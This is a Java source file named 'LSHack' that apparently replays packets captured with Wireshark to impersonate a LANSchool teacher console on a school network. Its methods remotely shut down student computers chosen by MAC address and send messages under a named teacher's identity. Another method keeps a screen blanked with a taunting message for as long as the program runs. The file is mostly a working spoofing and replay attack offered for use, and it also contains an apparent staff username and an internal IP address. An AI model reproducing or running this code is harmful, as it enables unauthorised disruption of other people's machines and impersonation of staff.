import java.io.*;
import java.math.BigInteger;
import java.net.*;
import java.net.InetAddress;
import java.util.Scanner;
import java.util.HashMap;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

/*
In order to get the strings that are sent for the various methods
Simply open wireshark on the host computer,
put in the filter box ip.src==(this computers current ip)&&ip.dst==(ip of some computer with LANschool)
then do the action you want to emulate, look for the packet with a sizeable length (not like 2)
and copy the contained data (not the header) into the decode method, and send the resulting byte array
*/
public class LSHack{
//the port to use for UDP connections on local machine, this will every time LANschool is restarted, however,
//and will only work when LANschool is shut down
//my current method for making this work is starting LANschool and wireshark, recording the port used for
//a UDP screen blank, closing LANschool, and changing this number to the last recorded port
final static int LOCAL_PORT_UDP = 51701;
//as far as I can tell the same local TCP port is used all the time, or if it changes it doesnt matter
//this value has never given me issues, so it probably doesnt need to be changed
final static int LOCAL_PORT_TCP = 51819;
//as far as i can tell, this port is used for everything at all times, so it's pretty unnecessary to change
final static int CLIENT_PORT = 796;
/*
This method shuts down the computer at the given MAC
*/
public static void shutdown(String mac_add) throws Exception{
	Socket socket = new Socket(InetAddress.getByName(macToIP(mac_add)), CLIENT_PORT, InetAddress.getByName("10.204.4.236"),LOCAL_PORT_TCP);
	//this string was gotten in the fashion described at the beginning of the code
	byte[] tosend = decode("4d11a00f89a5a85353d10c0000000d0000005348532d3130443838303441420000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000067616c6272616974686a6100000000000000000000000000000000000000000000");
	try{
	sendBytes(socket,tosend);
	socket.close();
	}catch(IOException e){
		e.printStackTrace();
		System.out.println(e);
	}
}
public static void message(String message,String mac_add)throws Exception{
	byte i = 123;
	message = hexadecimal(message,"utf-8");
	Socket socket = new Socket(InetAddress.getByName(macToIP(mac_add)), CLIENT_PORT, InetAddress.getByName("10.204.4.236"),LOCAL_PORT_TCP);
	// I don't know why but constructing the body like this is like the only way that works
	String prestuff = "0811a00f89a5"+asHex(new byte[]{i})+"5353d100000000";
	//defines who's sending the message, but you have to use this one because G is the only one who 
	//can send messages
	String mh = "galbraithja ("+InetAddress.getLocalHost().getHostName()+")";
	mh = prestuff+hexadecimal(mh,"utf-8");
	//uses a special decoding method that adds in a bund of zeroes for padding
	byte[] tosend = decode(mh,message);
	//System.out.println(new String(tosend));
	try{
	sendBytes(socket,tosend);
	socket.close();
	}catch(IOException e){
		e.printStackTrace();
		System.out.println(e);
		System.out.println("not sent :(");
	}
	System.out.println("sent");
}
/*
works the same as the other methods except with two key differences
1. Uses UDP instead of TCP, which really has no effect on functionality it's just annoying
2.repeatedly sends the blank message, so you need the while loop

You can set the time to -1 to make it blank as long as this program is running
*/
public static void blank(int time, String mac_add)throws Exception{
	DatagramSocket socket = new DatagramSocket(LOCAL_PORT_UDP);
	byte[] tosend = decode("5411a00f89a51d5153d1ffffffff5468697320697320776861742069732077686174207368616d6566756c2070656f706c65206c6f6f6b206c696b65202d2d3e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000acc0715dad40000dad4");
	int time_gone = 0;
	try{
	while(time_gone<time){
	DatagramPacket sendPacket = new DatagramPacket(tosend, tosend.length,InetAddress.getByName(macToIP(mac_add)),CLIENT_PORT);
	socket.send(sendPacket);
	time_gone+=(time==-1)?0:2;
	TimeUnit.SECONDS.sleep(2);
	}
	}catch(IOException e){
		e.printStackTrace();
		System.out.println(e);
		System.out.println("not sent :(");
	}
	System.out.println("sent");
}
//literally just converts a string to the hex version of itself
private static String hexadecimal(String input, String charsetName) throws UnsupportedEncodingException {
    if (input == null) throw new NullPointerException();
    return asHex(input.getBytes(charsetName));
}
//parses arp table from command line to convert mac address to ip
private static String macToIP(String mac) throws Exception{
	String[] arptable = getARPTable().split("\n");
	//parse the arp table to convert macs to ips
	HashMap<String,String> maciptable = new HashMap<String,String>();
	for(String k : arptable){
			if(k.contains("dynamic")){
			k = k.replaceAll("\t"," ");
			k = k.trim();
			String[] sections = k.split(" ");
			ArrayList<String> secs = new ArrayList<String>();
			for(String ko : sections){
				if(ko.contains(".") || ko.contains("-")){
					secs.add(ko.trim());
				}
			}
			maciptable.put(secs.get(1),secs.get(0));
			}
	}
	System.out.println("MAC resolved to ip: "+maciptable.get(mac));
	return maciptable.get(mac);
}
//gets arp table from command line
private static String getARPTable() throws IOException {
           Scanner s = new Scanner(Runtime.getRuntime().exec("arp -a").getInputStream()).useDelimiter("\\A");
               return s.hasNext() ? s.next() : "";
         
}
private static final char[] HEX_CHARS = "0123456789abcdef".toCharArray();

private static String asHex(byte[] buf)
{
    char[] chars = new char[2 * buf.length];
    for (int i = 0; i < buf.length; ++i)
    {
        chars[2 * i] = HEX_CHARS[(buf[i] & 0xF0) >>> 4];
        chars[2 * i + 1] = HEX_CHARS[buf[i] & 0x0F];
    }
    return new String(chars);
}
//converts hex string to byte array
private static byte[] decode(String hex1){
	return new BigInteger(hex1, 16).toByteArray();
	}
//converts hex string to byte array and adds some padding that formats it right for sending messages
private static byte[] decode(String hex1, String hex2){
	byte[] bb1 = new BigInteger(hex1, 16).toByteArray();
	byte[] bb2 = new BigInteger(hex2, 16).toByteArray();
	byte[] ret = new byte[bb1.length+bb2.length+102];
	for(int i = 0; i<bb1.length; i++){
			ret[i] = bb1[i];
	}
	for(int i=0; i<101; i++){
		ret[i+bb1.length]=0;
	}
	for(int i=0; i<bb2.length; i++){
		ret[i+bb1.length+101]=bb2[i];
	}
	ret[ret.length-1] = 0;
	return ret;
	}
//sends bytes via TCP socket
private static void sendBytes(Socket socket,byte[] myByteArray) throws IOException {
    sendBytes(socket,myByteArray, 0, myByteArray.length);
}
//sends bytes via TCP socket
private static void sendBytes(Socket socket, byte[] myByteArray, int start, int len) throws IOException {
    if (len < 0)
        throw new IllegalArgumentException("Negative length not allowed");
    if (start < 0 || start >= myByteArray.length)
        throw new IndexOutOfBoundsException("Out of bounds: " + start);
    // Other checks if needed.
    OutputStream out = socket.getOutputStream(); 
    DataOutputStream dos = new DataOutputStream(out);
    if (len > 0) {
        dos.write(myByteArray, start, len);
	}
	dos.flush();
}
}